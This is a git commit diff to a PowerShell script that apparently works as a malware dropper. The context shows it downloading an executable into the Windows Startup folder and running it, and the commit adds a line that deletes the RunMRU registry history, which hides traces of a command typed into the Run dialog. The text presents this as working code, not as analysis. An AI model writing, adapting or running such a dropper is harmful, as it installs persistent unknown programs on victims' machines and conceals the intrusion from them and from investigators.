16f47f86ff07eb61a173241e056c38f4b6827012
qwertyuiopindia <93660031+qwertyuiopindia@users.noreply.github.com>
2021-11-04 01:09:35 +0600

    Update script.ps1

--- script.ps1
+++ script.ps1
@@ -5,3 +5,4 @@ $file = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\AW_prod.ex
 $down.DownloadFile($url,$file)
 $exec = New-Object -com shell.application
 $exec.shellexecute($file)
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
